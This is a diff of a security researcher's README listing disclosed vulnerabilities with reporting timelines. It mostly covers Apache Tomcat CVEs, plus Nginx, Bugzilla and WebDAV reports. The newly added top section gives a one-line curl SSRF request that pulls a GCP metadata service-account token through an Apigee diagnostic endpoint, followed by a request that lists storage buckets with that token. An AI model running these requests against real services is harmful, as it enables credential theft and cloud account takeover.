@@ -1,35 +1,37 @@
 # cve
-## [CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813) - Tomcat - Potential RCE and/or information disclosure and/or information corruption with partial PUT
+
+## CVE-/-/ - Google Cloud Apigee api mis-routing is a **Intended Behavior**
+
+**1-Line curl, unauthenticated auttacker could bypass **Cloud Apigee to Full Application and Cloud Asset Takeover**
+
+```bash
+curl "https://<vulnerable-apigee-service>/<public-api>/<crafted-uri>/<admin-api>diag-curl?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+```
+
+```bash
+echo "--- 2A-ii. Proof of Confidentiality Breach: Listing Storage Buckets ---"
+
+GET /storage/v1/b?project=${PROJECT_ID} HTTP/2
+Host: storage.******apis.com
+Authorization: Bearer ${ACCESS_TOKEN}
+# → SC 200
+```
+
 |Date|Status|Comment|
 |:--:|:--:|:--:|
-|Jan 13, 2025|Private|Reported to tomcat security team|
-|Mar 10, 2025|Public|Published|
+|Oct 03, 2025|Private|Reported to ****** Cloud Security Team|
+|Nov 05, 2025|Private|Marked as 'Won't fix (Intended behavior)'|
 
-## [CVE-2025-PoC-Tomcat-DoS-0314](https://github.com/gregk4sec/CVE-2025-PoC-Tomcat-DoS-0314)
-
-## [CVE-2025-31651](https://github.com/gregk4sec/CVE-2025-31651) - Tomcat - Rewrite rule bypass
-|Date|Status|Comment|
-|:--:|:--:|:--:|
-|Feb 28, 2025|Private|Reported to tomcat security team|
-|Apr 28, 2025|Public|Published|
-
-## [CVE-2025-46701](https://github.com/gregk4sec/CVE-2025-46701) - Tomcat - CGI security constraint bypass
-|Date|Status|Comment|
-|:--:|:--:|:--:|
-|Apr 09, 2025|Private|Reported to tomcat security team|
-|May 29, 2025|Public|Published|
-
-## [CVE-2025-49125](https://github.com/gregk4sec/CVE-2025-49125) - Tomcat - Security constraint bypass for pre/post-resources
+## [CVE-2025-55668](https://github.com/gregk4sec/CVE-2025-55668) - Tomcat - Session fixation via rewrite valve
 |Date|Status|Comment|
 |:--:|:--:|:--:|
 |May 30, 2025|Private|Reported to tomcat security team|
-|Jun 16, 2025|Public|Published|
+|Aug 13, 2025|Public|Published|
 
-## [CVE-2025-?](https://github.com/gregk4sec/TBD) - Bugzilla - TBD
+## [TBD](https://github.com/gregk4sec/TBD) - Nginx Path Traversal
 |Date|Status|Comment|
 |:--:|:--:|:--:|
-|Jun 20, 2025|Private|Reported to mozilla-bugzilla security team|
-
+|July 4, 2025|Private|Reported to Nginx Github Security|
 
 ## [CVE-2025-44160](https://github.com/gregk4sec/TBD) - WebDAV DoS
 |Date|Status|Comment|
@@ -38,14 +40,33 @@
 |Mar 13, 2025|Private|Reported to CVE.org|
 |Jun 26, 2025|Private|Confirmed with CVE Number|
 
-## [TBD](https://github.com/gregk4sec/TBD) - Nginx Path Traversal
+## [CVE-2025-?](https://github.com/gregk4sec/TBD) - Bugzilla - TBD
 |Date|Status|Comment|
 |:--:|:--:|:--:|
-|July 4, 2025|Private|Reported to Nginx Github Security|
+|Jun 20, 2025|Private|Reported to mozilla-bugzilla security team|
 
-## [CVE-2025-55668](https://github.com/gregk4sec/CVE-2025-55668) - Tomcat - Session fixation via rewrite valve
+## [CVE-2025-49125](https://github.com/gregk4sec/CVE-2025-49125) - Tomcat - Security constraint bypass for pre/post-resources
 |Date|Status|Comment|
 |:--:|:--:|:--:|
 |May 30, 2025|Private|Reported to tomcat security team|
-|Aug 13, 2025|Public|Published|
+|Jun 16, 2025|Public|Published|
 
+## [CVE-2025-46701](https://github.com/gregk4sec/CVE-2025-46701) - Tomcat - CGI security constraint bypass
+|Date|Status|Comment|
+|:--:|:--:|:--:|
+|Apr 09, 2025|Private|Reported to tomcat security team|
+|May 29, 2025|Public|Published|
+
+## [CVE-2025-31651](https://github.com/gregk4sec/CVE-2025-31651) - Tomcat - Rewrite rule bypass
+|Date|Status|Comment|
+|:--:|:--:|:--:|
+|Feb 28, 2025|Private|Reported to tomcat security team|
+|Apr 28, 2025|Public|Published|
+
+## [CVE-2025-PoC-Tomcat-DoS-0314](https://github.com/gregk4sec/CVE-2025-PoC-Tomcat-DoS-0314)
+
+## [CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813) - Tomcat - Potential RCE and/or information disclosure and/or information corruption with partial PUT
+|Date|Status|Comment|
+|:--:|:--:|:--:|
+|Jan 13, 2025|Private|Reported to tomcat security team|
+|Mar 10, 2025|Public|Published|
